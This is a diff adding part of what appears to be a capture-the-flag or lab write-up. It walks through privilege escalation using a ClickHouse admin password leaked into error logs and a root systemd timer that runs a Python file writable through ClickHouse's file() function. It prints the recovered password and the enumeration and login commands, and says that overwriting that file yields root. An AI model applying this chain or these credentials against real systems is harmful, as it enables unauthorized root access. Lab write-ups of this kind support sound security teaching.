@@ -1399,6 +1399,95 @@ Double quoted string is not closed: Syntax error: failed at position 1
 ```
 
 Key finding: the ClickHouse `default` account password is `N3v3rs33nD4T4`. An operator ran `ALTER USER default IDENTIFIED BY 'N3v3rs33nD4T4` with an unclosed quote; ClickHouse rejected the statement and logged it verbatim, leaking the intended password. The `default` account is the administrative ClickHouse user, so the next task is to find what runs as root and relies on ClickHouse.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### 5.4 Analyze the Root-Run DLQ Drainer
+
+A systemd timer runs a Python drainer as root every two minutes. Read the script and units to find the exact code path root executes, then confirm the recovered ClickHouse credential can reach it.
+
+#### 5.4.1 Read the drainer, timer, and service
+
+Enumerate the scheduled job: the Python it runs, how often, and as whom.
+
+**Command:**
+
+```bash
+cat /opt/ops/dlq_drainer.py
+systemctl cat aidx-dlq-drainer.timer
+systemctl cat aidx-dlq-drainer.service
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `cat /opt/ops/dlq_drainer.py` | Read the job | Shows what the scheduled script does each run. |
+| `systemctl cat ...timer` | Schedule | Reveals the firing interval. |
+| `systemctl cat ...service` | Run context | Shows the user the job runs as and the command it launches. |
+
+**Result:** (key lines)
+
+```shell
+# dlq_drainer.py
+FORMATTER = os.environ.get("AIDX_FORMATTER",
+                           "/var/lib/clickhouse/user_files/aidx_quarantine.py")
+def _format(raw):
+    p = subprocess.run(["python3", FORMATTER], input=raw, capture_output=True, check=False)
+
+# aidx-dlq-drainer.timer
+OnBootSec=1min
+OnUnitActiveSec=2min
+
+# aidx-dlq-drainer.service
+Type=oneshot
+User=root
+ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py
+```
+
+Key finding: for every message drained off the DLQ topic, the root service executes `python3 /var/lib/clickhouse/user_files/aidx_quarantine.py`. That path is inside ClickHouse's `user_files` directory. Whoever can write that file gets root code execution on the next 2-minute tick.
+
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+#### 5.4.2 Confirm the default credential and its FILE grant
+
+The formatter path lives under `user_files`, which ClickHouse's `file()` function writes to. Confirm the recovered `default` credential works locally and holds the `FILE` privilege.
+
+**Command:**
+
+```bash
+clickhouse-client --host 127.0.0.1 --user default --password 'N3v3rs33nD4T4' -q 'SELECT currentUser()'
+clickhouse-client --host 127.0.0.1 --user default --password 'N3v3rs33nD4T4' -q 'SHOW GRANTS'
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `clickhouse-client --user default --password '...'` | Authenticate | Connects locally as the admin account recovered from the logs. |
+| `SELECT currentUser()` | Confirm identity | Verifies the login succeeds and returns `default`. |
+| `SHOW GRANTS` | Check privileges | Lists the account's grants; `FILE` is required to write via `file()`. |
+
+**Result:** (trimmed)
+
+```shell
+default
+
+GRANT CHECK, SHOW, SELECT, INSERT, ALTER, CREATE, DROP, ..., FILE, URL, REMOTE, ...
+  SOURCES ON *.* TO default WITH GRANT OPTION
+```
+
+Key finding: the credential authenticates as `default` and the grant list includes `FILE`. ClickHouse can therefore write the root-executed formatter through `file()`, so overwriting `aidx_quarantine.py` with attacker Python yields root.
+
 
 
 <div align="center">
